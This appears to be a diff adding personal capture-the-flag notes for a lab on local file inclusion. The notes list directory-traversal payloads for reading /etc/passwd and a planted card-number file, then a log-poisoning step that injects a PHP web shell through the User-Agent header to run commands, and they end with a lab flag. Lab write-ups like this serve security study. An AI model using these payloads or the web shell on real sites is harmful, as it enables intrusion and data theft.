@@ -1,0 +1,30 @@
+IP : 10.10.125.199
+
+Open ports : 80
+
+Enumaration:
+	Link to three walkthroughs
+
+LFI Walkthrugh 1 (Basics) :
+	?page=home.html : You included home.html
+
+	read /etc/passwd : User name found : lfi
+
+
+
+LFI using Directory Traversal :
+	?page=home.html : Dosent works because it is being converted to html/home.html, it is loading from html directory
+	?page=../creditcard : load creditcard from one directory up : 1111-2222-3333-4444
+	page=../../../../../etc/passwd : to read /etc/passwd
+
+
+Reaching RCE using LFI and log poisoning:
+	?page=/var/log/apache2/access.log : read log file
+
+	add php script to rewuest headers in agent field :
+		<?php system($_GET['command']); ?>
+
+	new set of parameters to run : http://<IP>/lfi/lfi.php?page=/var/log/apache2/access.log&lfi=
+	
+	uname -r : 4.15.0-72-generic
+	flag.txt : THM{a352a5c2acfd22251c3a94105b718fea}
